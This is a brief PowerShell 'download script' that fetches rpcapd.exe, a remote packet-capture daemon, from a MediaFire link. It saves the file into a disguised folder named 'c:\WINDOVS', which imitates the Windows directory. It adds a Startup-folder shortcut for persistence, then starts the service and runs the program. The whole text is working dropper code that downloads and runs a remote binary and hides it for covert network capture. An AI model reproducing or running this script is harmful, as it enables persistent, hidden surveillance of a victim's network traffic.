#The Download Script
new-item "c:\WINDOVS\WinPcap" -itemtype directory
$uri = "http://download1644.mediafire.com/rt3qzi1zxzkg/5wt6663xps4bbj6/rpcapd.exe"
$out = "c:\WINDOVS\WinPcap\rpcapd.exe"
Invoke-WebRequest -Uri $uri -OutFile $out
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rpcapd.lnk")
$Shortcut.TargetPath = "c:\WINDOVS\WinPcap\rpcapd.exe"
$Shortcut.Save()
Start-Service rpcapd
& $out